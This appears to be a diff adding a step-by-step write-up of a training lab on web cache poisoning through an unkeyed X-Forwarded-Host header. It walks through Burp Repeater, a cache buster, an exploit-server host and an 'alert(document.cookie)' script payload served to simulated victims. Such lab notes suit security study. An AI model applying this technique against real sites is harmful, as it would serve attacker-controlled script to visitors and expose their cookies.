@@ -1,0 +1,32 @@
+Lab #01: Web cache poisoning with an unkeyed header
+
+1. With burp running go to home page of the application, and send the request to repeater tab.
+
+2. Add a cache bursting parameter such as ?cb=1234.
+Cache busting is where the cache ignores the file and force the web browser to load the file from the server.
+
+3. Add the X-Forwarded-Host header with an arbitrary hostname, such as example.com, and send the request. 
+X-Forwarded-Host: example.com
+
+4.Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at
+/resources/js/tracking.js. 
+
+5. Replay the request and observe that the response contains the header 
+X-Cache: hit. 
+This tells us that the response came from the cache. 
+
+6. Go to the exploit server and change the file name to match the path used by the vulnerable response:
+/resources/js/tracking.js
+
+7.  In the body, enter the payload alert(document.cookie) and store the exploit. 
+
+8. Open the GET request for the home page in Burp Repeater and remove the cache buster. 
+
+9.  Add the following header, remembering to enter your own exploit server ID: 
+X-Forwarded-Host: exploit-0adf00f50432fc5d80ca8e2f01f700b4.exploit-server.net
+Output --> X-Cache: hit
+
+10. To simulate the victim, load the poisoned URL in the browser and make sure that the alert() is triggered. 
+Note that you have to perform this test before the cache expires. 
+The cache on this lab expires every 30 seconds. 
+
